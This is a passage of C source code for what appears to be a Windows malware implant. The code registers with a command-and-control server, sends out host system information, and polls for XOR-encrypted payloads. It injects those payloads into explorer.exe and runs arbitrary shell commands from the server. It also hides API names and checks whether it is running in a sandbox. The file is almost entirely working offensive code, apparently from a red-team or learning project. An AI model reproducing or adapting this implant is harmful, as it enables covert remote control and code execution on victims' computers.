        DEBUG("[Payload Parser] Detected Base64 encoding (length: %zu)\n", encoded_len);
        max_payload_size = (encoded_len * 3) / 4 + 1;
    }

    // Allocate buffer for decoded payload
    task->payload = (unsigned char*)malloc(max_payload_size);
    if (!task->payload) {
        free(encoded_string);
        DEBUG("[Payload Parser - Error] Failed to allocate memory for payload\n");
        return -1;
    }

    // Decode using appropriate decoder
    int decoded_size;

    if (is_hex) {
        // Hex string → bytes
        decoded_size = hex_to_bytes(encoded_string, task->payload, max_payload_size);
        if (decoded_size < 0) {
            free(task->payload);
            free(encoded_string);
            task->payload = NULL;
            DEBUG("[Payload Parser - Error] Failed to decode hex payload\n");
            return -1;
        }
        DEBUG("[Payload Parser] Payload decoded from hex: %d bytes\n", decoded_size);
    } else {
        // Base64 → bytes (XOR encrypted)
        decoded_size = base64_to_bytes(encoded_string, task->payload, max_payload_size);
        if (decoded_size < 0) {
            free(task->payload);
            free(encoded_string);
            task->payload = NULL;
            DEBUG("[Payload Parser - Error] Failed to decode Base64 payload\n");
            return -1;
        }
        DEBUG("[Payload Parser] Payload decoded from Base64: %d bytes (XOR encrypted)\n", decoded_size);
    }

    free(encoded_string);

    // Decrypt payload with polyalphabetic XOR key from store
    if (!is_payload_xor_key_valid()) {
        DEBUG("[Payload Parser - Error] No valid XOR key available\n");
        free(task->payload);
        task->payload = NULL;
        return -1;
    }

    const unsigned char* xor_key_array = get_payload_xor_key();
    size_t xor_key_len = get_payload_xor_key_len();

    DEBUG("[Payload Parser] Decrypting payload with polyalphabetic XOR key (%zu bytes)\n", xor_key_len);
    DEBUG("[Payload Parser] Key preview: 0x%02X 0x%02X 0x%02X 0x%02X...\n",
          xor_key_array[0], xor_key_array[1], xor_key_array[2], xor_key_array[3]);

    decrypt_poly(task->payload, decoded_size, xor_key_array, xor_key_len);

    DEBUG("[Payload Parser - Success] Payload decrypted: %d bytes\n", decoded_size);

    // Afficher le payload décrypté en hexadécimal
    print_hex_dump(task->payload, decoded_size, "Decrypted Payload");

    task->payload_size = (size_t)decoded_size;
    task->type = TASK_INJECT;

    // Use default target process (explorer.exe)
    strcpy(task->target_process, "explorer.exe");
    snprintf(task->task_id, sizeof(task->task_id), "inject-%lu", (unsigned long)time(NULL));

    DEBUG("[Payload Parser] Target process: %s\n", task->target_process);

    return 1;
}

/**
 * Register agent with C2 server
 * Sends system info and UUID, receives agent_id and xor_key
 */
int register_with_c2(const char* uuid, const char* system_info_json, C2RegistrationResponse* response) {
    DEBUG("[C2 - Start] Registering with C2 server %s:%d\n", C2_SERVER, C2_PORT);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        DEBUG("[C2 - Error] WSAStartup failed: %d\n", WSAGetLastError());
        return -1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        DEBUG("[C2 - Error] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);

    DEBUG("[C2 - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        DEBUG("[C2 - Error] Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    DEBUG("[C2 - Connect] Connected successfully\n");

    // Build HTTP POST request
    char http_request[16384];
    char post_body[8192];

    snprintf(post_body, sizeof(post_body),
             "{\"uuid\":\"%s\",\"system_info\":%s}",
             uuid, system_info_json);

    snprintf(http_request, sizeof(http_request),
             "POST %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             C2_REGISTER_PATH, C2_SERVER, C2_PORT, strlen(post_body), post_body);

    // Send HTTP request
    DEBUG("[C2 - Send] Sending registration request...\n");
    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
        DEBUG("[C2 - Error] Send failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    DEBUG("[C2 - Send] Request sent successfully\n");

    // Receive HTTP response
    char recv_buffer[8192] = {0};
    int total_received = 0;
    int bytes_received;

    DEBUG("[C2 - Receive] Waiting for response...\n");
    while ((bytes_received = recv(sock, recv_buffer + total_received,
                                  sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
        total_received += bytes_received;
        if (total_received >= sizeof(recv_buffer) - 1) break;
    }

    if (total_received <= 0) {
        DEBUG("[C2 - Error] No response received\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    recv_buffer[total_received] = '\0';
    DEBUG("[C2 - Receive] Received %d bytes\n", total_received);

    // Find JSON body (after HTTP headers)
    char* json_body = strstr(recv_buffer, "\r\n\r\n");
    if (json_body) {
        json_body += 4; // Skip the \r\n\r\n
        DEBUG("[C2 - Response] JSON: %s\n", json_body);

        if (parse_c2_response(json_body, response) == 0) {

            DEBUG("[C2 - Success] Registered with agent_id: %s\n", response->agent_id);
            DEBUG("[C2 - Success] Received XOR key: %s\n", response->xor_key);
        } else {
            DEBUG("[C2 - Error] Failed to parse C2 response\n");
            closesocket(sock);
            WSACleanup();
            return -1;
        }
    } else {
        DEBUG("[C2 - Error] No JSON body found in response\n");
        closesocket(sock);
        WSACleanup();
        return -1;
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();

    return 0;
}



/**
 * Send architecture information to C2 server
 */
int send_architecture_to_c2(const char* agent_id, const SystemInfo* sysInfo) {
    DEBUG("[C2 - Arch Update] Sending system architecture to C2 server %s:%d\n", C2_SERVER, C2_PORT);

    // Generate C2 format JSON
    char c2_json_buffer[16384];
    if (system_info_to_c2_json(agent_id, sysInfo, c2_json_buffer, sizeof(c2_json_buffer)) != 0) {
        DEBUG("[C2 - Arch Update - Error] Failed to serialize system info to C2 JSON format\n");
        return -1;
    }

    DEBUG("[C2 - Arch Update - JSON] Payload:\n%s\n", c2_json_buffer);

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        DEBUG("[C2 - Arch Update - Error] WSAStartup failed: %d\n", WSAGetLastError());
        return -1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        DEBUG("[C2 - Arch Update - Error] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);

    DEBUG("[C2 - Arch Update - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        DEBUG("[C2 - Arch Update - Error] Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    DEBUG("[C2 - Arch Update - Connect] Connected successfully\n");

    // Build HTTP POST request
    char http_request[32768];
    snprintf(http_request, sizeof(http_request),
             "POST %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             C2_ARCH_UPDATE_PATH, C2_SERVER, C2_PORT, strlen(c2_json_buffer), c2_json_buffer);

    // Send HTTP request
    DEBUG("[C2 - Arch Update - Send] Sending architecture update...\n");
    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
        DEBUG("[C2 - Arch Update - Error] Send failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    DEBUG("[C2 - Arch Update - Send] Request sent successfully\n");

    // Receive HTTP response
    char recv_buffer[8192] = {0};
    int total_received = 0;
    int bytes_received;

    DEBUG("[C2 - Arch Update - Receive] Waiting for response...\n");
    while ((bytes_received = recv(sock, recv_buffer + total_received,
                                  sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
        total_received += bytes_received;
        if (total_received >= sizeof(recv_buffer) - 1) break;
    }

    if (total_received > 0) {
        recv_buffer[total_received] = '\0';
        DEBUG("[C2 - Arch Update - Receive] Received %d bytes\n", total_received);
    } else {
        DEBUG("[C2 - Arch Update - Warning] No response received\n");
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();

    DEBUG("[C2 - Arch Update - Success] Architecture update completed\n");
    return 0;
}




/**
 * Execute a task received from C2
 */
int execute_task(const Task* task, unsigned char xor_function_key, unsigned char xor_process_key) {
    if (!task) return -1;

    DEBUG("[Task Execution] Executing task: type=%d, id=%s\n", task->type, task->task_id);

    switch (task->type) {
        case TASK_INJECT:
            DEBUG("[Task Execution - Inject] Target process: %s\n", task->target_process);

            // Initialize injection APIs if not already done
            if (initialize_injection_apis(xor_function_key) != 0) {
                DEBUG("[Task Execution - Inject - Error] Failed to initialize injection APIs\n");
                return -1;
            }

            // Use provided payload or default test payload
            unsigned char* payload = task->payload;
            size_t payload_size = task->payload_size;

            if (perform_injection(task->target_process, payload, payload_size) == 0) {
                DEBUG("[Task Execution - Inject - Success] Injection completed successfully\n");
                return 0;
            } else {
                DEBUG("[Task Execution - Inject - Error] Injection failed\n");
                return -1;
            }
            break;

        case TASK_EXECUTE_CMD:
            DEBUG("[Task Execution - Execute] Command: %s\n", task->command);
            int result = system(task->command);
            DEBUG("[Task Execution - Execute - Complete] Command executed with result: %d\n", result);
            return 0;

        case TASK_SLEEP:
            DEBUG("[Task Execution - Sleep] Sleeping for %d ms\n", task->sleep_duration);
            Sleep(task->sleep_duration);
            DEBUG("[Task Execution - Sleep - Complete] Sleep finished\n");
            return 0;

        case TASK_EXIT:
            DEBUG("[Task Execution - Exit] Exiting agent\n");
            exit(0);
            break;

        case TASK_DOWNLOAD:
            DEBUG("[Task Execution - Download] Not implemented yet\n");
            return -1;

        case TASK_UPLOAD:
            DEBUG("[Task Execution - Upload] Not implemented yet\n");
            return -1;

        default:
            DEBUG("[Task Execution - Error] Unknown task type: %d\n", task->type);
            return -1;
    }

    return 0;
}

int send_heartbeat_to_c2(const char* agent_id, char* response_buffer, size_t buffer_size) {
    DEBUG("[C2 - Heartbeat] Sending heartbeat to C2 server %s:%d\n", C2_SERVER, C2_PORT);

    if (response_buffer) {
        response_buffer[0] = '\0';
    }

    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        DEBUG("[C2 - Heartbeat - Error] WSAStartup failed: %d\n", WSAGetLastError());
        return -1;
    }

    SOCKET sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
    if (sock == INVALID_SOCKET) {
        DEBUG("[C2 - Heartbeat - Error] Socket creation failed: %d\n", WSAGetLastError());
        WSACleanup();
        return -1;
    }

    struct sockaddr_in server_addr;
    server_addr.sin_family = AF_INET;
    server_addr.sin_port = htons(C2_PORT);
    server_addr.sin_addr.s_addr = inet_addr(C2_SERVER);

    DEBUG("[C2 - Heartbeat - Connect] Connecting to %s:%d...\n", C2_SERVER, C2_PORT);
    if (connect(sock, (struct sockaddr*)&server_addr, sizeof(server_addr)) == SOCKET_ERROR) {
        DEBUG("[C2 - Heartbeat - Error] Connection failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    DEBUG("[C2 - Heartbeat - Connect] Connected successfully\n");

    // Build HTTP POST request with JSON body
    char http_request[1024];
    char post_body[256];

    snprintf(post_body, sizeof(post_body),
             "{\"agent_id\":\"%s\"}",
             agent_id);

    snprintf(http_request, sizeof(http_request),
             "POST %s HTTP/1.1\r\n"
             "Host: %s:%d\r\n"
             "Content-Type: application/json\r\n"
             "Content-Length: %zu\r\n"
             "Connection: close\r\n"
             "\r\n"
             "%s",
             C2_HEARTBEAT_PATH, C2_SERVER, C2_PORT, strlen(post_body), post_body);

    // Send HTTP request
    DEBUG("[C2 - Heartbeat - Send] Sending heartbeat with body: %s\n", post_body);
    if (send(sock, http_request, strlen(http_request), 0) == SOCKET_ERROR) {
        DEBUG("[C2 - Heartbeat - Error] Send failed: %d\n", WSAGetLastError());
        closesocket(sock);
        WSACleanup();
        return -1;
    }
    DEBUG("[C2 - Heartbeat - Send] Request sent successfully\n");

    // Receive HTTP response
    char recv_buffer[8192] = {0};
    int total_received = 0;
    int bytes_received;

    DEBUG("[C2 - Heartbeat - Receive] Waiting for response...\n");
    while ((bytes_received = recv(sock, recv_buffer + total_received,
                                    sizeof(recv_buffer) - total_received - 1, 0)) > 0) {
        total_received += bytes_received;
        if (total_received >= sizeof(recv_buffer) - 1) break;
    }

    if (total_received > 0) {
        recv_buffer[total_received] = '\0';
        DEBUG("[C2 - Heartbeat - Receive] Received %d bytes\n", total_received);

        // Find JSON body (after HTTP headers)
        char* json_body = strstr(recv_buffer, "\r\n\r\n");
        if (json_body && response_buffer) {
            json_body += 4; // Skip the \r\n\r\n
            DEBUG("[C2 - Heartbeat - Response] JSON: %s\n", json_body);

            // Copy to response buffer
            strncpy(response_buffer, json_body, buffer_size - 1);
            response_buffer[buffer_size - 1] = '\0';
        }
    } else {
        DEBUG("[C2 - Heartbeat - Warning] No response received\n");
    }

    // Cleanup
    closesocket(sock);
    WSACleanup();

    DEBUG("[C2 - Heartbeat - Success] Heartbeat sent successfully\n");
    return total_received > 0 ? 0 : -1;
}




// ============================================================================
// SANDBOX DETECTION FUNCTIONS
// ============================================================================

int run_sandbox_checks(const SystemInfo* sysInfo) {
    DEBUG("[Sandboxing Detection - Start] Running anti-sandbox checks...\n");

    // Check CPU count
    DEBUG("[Sandboxing Detection - CPU] Detected %d processors (threshold: %d)\n",
          sysInfo->nb_processors, THRESHOLD_MAX_CPU);
    if (sysInfo->nb_processors < THRESHOLD_MAX_CPU) {
        DEBUG("[Sandboxing Detection - Check CPU] Suspicious environment detected: %d processors.\n",
              sysInfo->nb_processors);
        // return -1;
    }

    // Check RAM size
    DEBUG("[Sandboxing Detection - RAM] Detected %llu MB (threshold: %d MB)\n",
          (unsigned long long)sysInfo->total_ram_mb, THRESHOLD_MIN_RAM_MB);
    if (sysInfo->total_ram_mb < THRESHOLD_MIN_RAM_MB) {
        DEBUG("[Sandboxing Detection - Check RAM] Suspicious environment detected: %llu MB of RAM.\n",
              (unsigned long long)sysInfo->total_ram_mb);
        // return -1;
    }

    // Check VM detection
    if (sysInfo->is_vm) {
        DEBUG("[Sandboxing Detection - VM] Virtual machine detected!\n");
        // return -1;
    } else {
        DEBUG("[Sandboxing Detection - VM] No virtual machine detected\n");
    }

    // Timing check
    DEBUG("[Sandboxing Detection - Timing] Starting timing check...\n");
    ULONGLONG start = GetTickCount64();
    for (long i = 0; i < 100000000; i++) { i % 2; }
    ULONGLONG end = GetTickCount64();
    ULONGLONG elapsed = end - start;
    DEBUG("[Sandboxing Detection - Timing] Elapsed time: %llu ms (minimum: 10 ms)\n", elapsed);

    if (elapsed < 10) {
        DEBUG("[Sandboxing Detection - Timing] Sandbox detected, exiting...\n");
        return -1;
    }

    DEBUG("[Sandboxing Detection - Complete] All checks passed\n");
    return 0;
}


// ============================================================================
// INJECTION API INITIALIZATION
// ============================================================================

int initialize_injection_apis(unsigned char xor_key) {
    static int initialized = 0;

    // Check if already initialized
    if (initialized) {
        DEBUG("[Injection APIs] Already initialized, skipping...\n");
        return 0;
    }

    DEBUG("[Decryption - Start] Decrypting all API strings (Reverse + XOR)...\n");

    decrypt_reverse_xor(encryptedKernel32, sizeof(encryptedKernel32), xor_key);
    DEBUG("[Decryption - Complete] Decrypted kernel32.dll string: %s\n", encryptedKernel32);

    decrypt_reverse_xor(encryptedGetModuleHandleA, sizeof(encryptedGetModuleHandleA), xor_key);
    DEBUG("[Decryption - Complete] Decrypted GetModuleHandleA string: %s\n", encryptedGetModuleHandleA);

    decrypt_reverse_xor(encryptedGetProcAddress, sizeof(encryptedGetProcAddress), xor_key);
    DEBUG("[Decryption - Complete] Decrypted GetProcAddress string: %s\n", encryptedGetProcAddress);

    decrypt_reverse_xor(encryptedVirtualAllocEx, sizeof(encryptedVirtualAllocEx), xor_key);
    DEBUG("[Decryption - Complete] Decrypted VirtualAllocEx string: %s\n", encryptedVirtualAllocEx);

    decrypt_reverse_xor(encryptedOpenProcess, sizeof(encryptedOpenProcess), xor_key);
    DEBUG("[Decryption - Complete] Decrypted OpenProcess string: %s\n", encryptedOpenProcess);

    decrypt_reverse_xor(encryptedVirtualProtectEx, sizeof(encryptedVirtualProtectEx), xor_key);
    DEBUG("[Decryption - Complete] Decrypted VirtualProtectEx string: %s\n", encryptedVirtualProtectEx);

    decrypt_reverse_xor(encryptedWriteProcessMemory, sizeof(encryptedWriteProcessMemory), xor_key);
    DEBUG("[Decryption - Complete] Decrypted WriteProcessMemory string: %s\n", encryptedWriteProcessMemory);

    decrypt_reverse_xor(encryptedCreateRemoteThread, sizeof(encryptedCreateRemoteThread), xor_key);
    DEBUG("[Decryption - Complete] Decrypted CreateRemoteThread string: %s\n", encryptedCreateRemoteThread);

    DEBUG("[Decryption - Complete] All API strings decrypted\n");

    // Dynamically resolve core functions
    DEBUG("[Dynamic Resolution - Start] Resolving core functions...\n");

    HMODULE hKernel32 = GetModuleHandleA((LPCSTR)encryptedKernel32);
    if (hKernel32 == NULL) {
        DEBUG("[Dynamic Resolution - Error] Failed to get kernel32.dll handle\n");
        return -1;
    }
    DEBUG("[Dynamic Resolution - Success] kernel32.dll handle: %p\n", hKernel32);

    // Resolve all injection API functions
    DEBUG("[GetProcAddress - Start] Resolving injection API functions...\n");

    virtualAllocEx = (pVirtualAllocEx)GetProcAddress(hKernel32, (LPCSTR)encryptedVirtualAllocEx);
    DEBUG("[GetProcAddress - API] VirtualAllocEx: %p\n", virtualAllocEx);

    openProcess = (pOpenProcess)GetProcAddress(hKernel32, (LPCSTR)encryptedOpenProcess);
    DEBUG("[GetProcAddress - API] OpenProcess: %p\n", openProcess);

    virtualProtectEx = (pVirtualProtectEx)GetProcAddress(hKernel32, (LPCSTR)encryptedVirtualProtectEx);
    DEBUG("[GetProcAddress - API] VirtualProtectEx: %p\n", virtualProtectEx);

    writeProcessMemory = (pWriteProcessMemory)GetProcAddress(hKernel32, (LPCSTR)encryptedWriteProcessMemory);
    DEBUG("[GetProcAddress - API] WriteProcessMemory: %p\n", writeProcessMemory);

    createRemoteThread = (pCreateRemoteThread)GetProcAddress(hKernel32, (LPCSTR)encryptedCreateRemoteThread);
    DEBUG("[GetProcAddress - API] CreateRemoteThread: %p\n", createRemoteThread);

    if (!openProcess || !virtualProtectEx || !writeProcessMemory || !virtualAllocEx || !createRemoteThread) {
        DEBUG("[ERROR] Cannot load all required functions\n");
        return -1;
    }

    DEBUG("[GetProcAddress - Complete] All API functions resolved successfully\n");

    // Mark as initialized
    initialized = 1;
    return 0;
}


// ============================================================================
// PROCESS SEARCHING FUNCTIONS
// ============================================================================

HANDLE getProcHandlebyName(LPCSTR procName, DWORD* PID) {
    PROCESSENTRY32 entry;
    entry.dwSize = sizeof(PROCESSENTRY32);
    HANDLE snapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);

    if (!snapshot) {
        DEBUG("[Process Searching] Failed to retrieve the %s process\n", procName);
        return NULL;
    }

    if (Process32First(snapshot, &entry)) {
        do {
            if (strcmp((entry.szExeFile), procName) == 0) {
                *PID = entry.th32ProcessID;
                DEBUG("[Process Searching] Injecting into : %d\n", *PID);
                HANDLE hProc = openProcess(PROCESS_ALL_ACCESS, FALSE, *PID);
                if (!hProc) { continue; }
                return hProc;
            }
        } while (Process32Next(snapshot, &entry));
    }

    return NULL;
}


// ============================================================================
// INJECTION FUNCTIONS
// ============================================================================

int perform_injection(const char* process_name, unsigned char* payload, size_t payload_size) {
    DEBUG("[Process Injection - Start] Beginning injection process...\n");

    DWORD PID = 0;
    HANDLE procHandle = getProcHandlebyName((LPCSTR)process_name, &PID);
    if (!procHandle) {
        DEBUG("[ERROR] Failed to open the process\n");
        return -1;
    }
    DEBUG("[+] Process handle: %p\n", procHandle);

    // Allocate memory
    DEBUG("[Memory Allocation - Start] Allocating remote buffer...\n");
    PVOID remoteBuffer = virtualAllocEx(procHandle, NULL, (SIZE_T)payload_size,
                                        MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (!remoteBuffer) {
        DEBUG("[ERROR] Failed to allocate process memory: %d\n", GetLastError());
        return -1;
    }
    DEBUG("[+] Remote buffer allocated at: %p\n", remoteBuffer);
    DEBUG("[Memory Allocation - Success] Buffer size: %zu bytes with RW permissions\n", payload_size);

    // Write payload
    DEBUG("[Memory Write - Start] Writing payload to remote process...\n");
    size_t szOutput;
    int status = writeProcessMemory(procHandle, remoteBuffer, payload, payload_size, &szOutput);
    if (!status) {
        DEBUG("[ERROR] Failed to write process memory: %d\n", GetLastError());
        return -1;
    }
    DEBUG("[Memory Write - Success] Written %zu bytes to remote process\n", szOutput);

    // Change memory protection
    DEBUG("[Memory Protection - Start] Changing memory protection to RX...\n");
    DWORD oldProtect;
    BOOL protectStatus = virtualProtectEx(procHandle, remoteBuffer, payload_size,
                                          PAGE_EXECUTE_READ, &oldProtect);
    if (!protectStatus) {
        DEBUG("[ERROR] Failed to reprotect the memory\n");
        return -1;
    }
    DEBUG("[Memory Protection - Success] Memory protection changed (old: 0x%lX, new: PAGE_EXECUTE_READ)\n", oldProtect);

    DEBUG("[Process Injection - Complete] Injection successful!\n");
    return 0;
}


// ============================================================================
// MAIN FUNCTION
// ============================================================================

int main(void) {

    if (!DEBUG_MODE) {
        FreeConsole();
    }

    //unsigned char* xor_process_key = NULL;
    
    // ------------------------------------------------------------------------
    // INITIALIZATION
    // ------------------------------------------------------------------------
    DEBUG("[Initialization - Start] Starting injector...\n");
    DEBUG("[Initialization - Debug] Debug mode is: %s\n", DEBUG_MODE ? "ENABLED" : "DISABLED");

    // Payload de test
    unsigned char scBytes[] = { 0x90, 0x90, 0x90, 0x90, 0xDE, 0xAD, 0xBE, 0xEF };
    size_t scLength = sizeof(scBytes);
    DEBUG("[Initialization - Payload] Payload length: %zu bytes\n", scLength);

    // UUID generation
    char uuid_base64[25] = {0};
    generate_uuid_base64(uuid_base64);
    DEBUG("[Initialization - UUID] Generated UUID (Base64): %s\n", uuid_base64);

    // ------------------------------------------------------------------------
    // SYSTEM INFORMATION COLLECTION
    // ------------------------------------------------------------------------
    DEBUG("[System Info - Start] Collecting system information...\n");

    SystemInfo sysInfo;
    if (collect_system_info(&sysInfo) != 0) {
        DEBUG("[System Info - Error] Failed to collect system information\n");
        return -1;
    }

    char json_buffer[8192];
    if (system_info_to_json(&sysInfo, json_buffer, sizeof(json_buffer)) == 0) {
        DEBUG("[System Info - JSON] System information in JSON format:\n%s\n", json_buffer);
    }

    // ------------------------------------------------------------------------
    // SANDBOXING DETECTION
    // ------------------------------------------------------------------------
    if (run_sandbox_checks(&sysInfo) != 0) {
        printf("\nSandbox detected. Press Enter to exit...\n");
        getchar();
        return 0;
    }

    // ------------------------------------------------------------------------
    // C2 REGISTRATION
    // ------------------------------------------------------------------------
    DEBUG("[C2 Registration - Start] Contacting C2 server...\n");

    C2RegistrationResponse c2_response;
    if (register_with_c2(uuid_base64, json_buffer, &c2_response) != 0) {
        DEBUG("[C2 Registration - Error] Failed to register with C2 server\n");
        printf("\nFailed to register with C2. Press Enter to exit...\n");
        getchar();
        return -1;
    } else {
        DEBUG("[C2 Registration - Success] Registered with C2 server\n");
        DEBUG("[C2 Registration - Success] Agent ID: %s\n", c2_response.agent_id);
        DEBUG("[C2 Registration - Success] XOR Key: %s\n", c2_response.xor_key);
        //xor_process_key = c2_response.xor_key;
    }




    // ------------------------------------------------------------------------
    // SEND ARCHITECTURE TO C2
    // ------------------------------------------------------------------------
    DEBUG("[C2 Communication - Architecture] Sending complete system info to C2 server...\n");
    if (send_architecture_to_c2(c2_response.agent_id, &sysInfo) != 0) {
        DEBUG("[C2 Communication - Architecture - Error] Failed to send architecture to C2\n");
        printf("\nFailed to send architecture to C2. Press Enter to exit...\n");
        getchar();
        return -1;
    }


    
    // ------------------------------------------------------------------------
    // INJECTION API INITIALIZATION
    // ------------------------------------------------------------------------
    unsigned char xor_function_key = 0x35;
    unsigned char xor_process_key = 0x1b;


    // ------------------------------------------------------------------------
    // HEARTBEAT LOOP WITH PAYLOAD DETECTION
    // ------------------------------------------------------------------------
    DEBUG("[Main Loop - Start] Entering heartbeat loop...\n");

    char heartbeat_response[8192];
    Task current_task;

    while (1)
    {
        DEBUG("[Main Loop] Sending heartbeat to C2...\n");

        if (send_heartbeat_to_c2(c2_response.agent_id, heartbeat_response, sizeof(heartbeat_response)) == 0) {

            // Use the stored XOR key from the global store
            int payload_result = parse_payload_from_response(heartbeat_response, &current_task, c2_response.xor_key);

            if (payload_result == 1) {
                DEBUG("[Main Loop - Payload Detected] Payload size: %zu bytes\n", current_task.payload_size);
                DEBUG("[Main Loop - Payload Detected] Target process: %s\n", current_task.target_process);

                
                // Debug: Show stored key information
                if (is_payload_xor_key_valid()) {
                    const unsigned char* key = get_payload_xor_key();
                    size_t key_len = get_payload_xor_key_len();
                    DEBUG("[Main Loop] Using stored polyalphabetic XOR key (%zu bytes)\n", key_len);
                    DEBUG("[Main Loop] Key preview: 0x%02X 0x%02X 0x%02X 0x%02X...\n",
                          key[0], key[1], key[2], key[3]);
                } else {
                    DEBUG("[Main Loop - WARNING] Stored XOR key is not valid!\n");
                }

                int exec_result = execute_task(&current_task, xor_function_key, xor_process_key);

                if (exec_result == 0) {
                    DEBUG("[Main Loop - Injection Completed] Payload injected successfully\n");
                } else {
                    DEBUG("[Main Loop - Injection Failed] Injection failed with code %d\n", exec_result);
                }

                if (current_task.payload) {
                    free(current_task.payload);
                    current_task.payload = NULL;
                }
            } else if (payload_result == 0) {
                // No payload (null or empty)
                DEBUG("[Main Loop] No payload to inject\n");
            } else {
                // Parse error
                DEBUG("[Main Loop - Error] Failed to parse payload from response\n");
            }
        } else {
            DEBUG("[Main Loop - Error] Heartbeat failed\n");
        }

        Sleep(5000);
    }
    
    getchar();
    return 0;
}
